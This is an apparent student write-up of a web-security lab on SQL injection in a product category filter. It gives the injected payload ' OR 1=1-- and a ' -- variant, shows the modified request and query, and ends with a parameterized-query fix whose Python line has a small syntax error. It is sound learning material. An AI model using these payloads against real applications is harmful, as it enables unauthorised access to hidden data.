# SQL Injection - WHERE clause vulnerability

## Goal:
This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

---

## Process

### 1. Intercept the GET request using Burp Suite
```http
GET /filter?category=Corporate+gifts HTTP/2
...
```

### 2. Modify the category parameter to inject SQL

**Injected payload:**

```sql
' OR 1=1--
```

Selecting injected sql and pressing "⌘U" in Burp Suite URL-encodes the selected portion of request.

**The GET request becomes:**

```http
GET /filter?category=Corporate+gifts'+OR+1=1-- HTTP/2
```

### 3. Explanation

`' OR 1=1--` closes the string with `'` and creates a condition that always returns true, bypassing the `released = 1` clause. The `--` comments out the rest of the SQL query.

**The SQL query becomes:**

```sql
SELECT * FROM products WHERE category = 'Corporate gifts' OR 1=1--' AND released = 1
```

This query returns all products, including those that are unreleased.

---

## How to fix this vulnerability

**Use Parameterized Queries (Prepared Statements)**

Never build SQL statements by directly concatenating user input. 

Vulnerable SQL query:
```sql
SELECT * FROM products WHERE category = ' " + user_input + " ' AND released = 1"
```

Safe version using prepared statements (python script):
```py
query = SELECT * FROM products WHERE category = ? AND released = 1"
cursor.execute(query, (user_input,))
```
Parameterised query treats user input as data and not as part of SQL code, which prevents injection.

---

## Reflection

- Learnt how SQL injection can bypass filtering logic (like `released = 1`) by injecting always-true conditions.
- Understood the importance of using **prepared statements** to prevent such attacks.
- Learnt that even simple GET requests can expose vulnerabilities if inputs are not properly sanitized.
- Gained insight into secured filtering logic through **proper input handling**.

---

## Notes

The sequence `' --` can also be used to close the string and comment out the rest of the query, bypassing the released = 1 clause.

---